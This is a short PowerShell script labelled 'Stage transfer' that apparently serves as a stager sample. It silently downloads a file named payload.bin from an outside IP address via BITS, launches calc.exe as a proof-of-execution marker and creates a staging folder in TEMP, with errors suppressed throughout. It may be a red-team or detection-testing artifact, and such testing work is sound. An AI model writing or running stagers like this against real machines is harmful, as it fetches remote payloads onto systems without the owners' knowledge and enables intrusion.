<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://203.0.113.17/stage1.ps1",
    [string]$PayloadPath = "$env:TEMP\payload.bin",
    [int]$TimeoutSec = 41
)
Start-BitsTransfer -Source $TargetUrl -Destination $PayloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
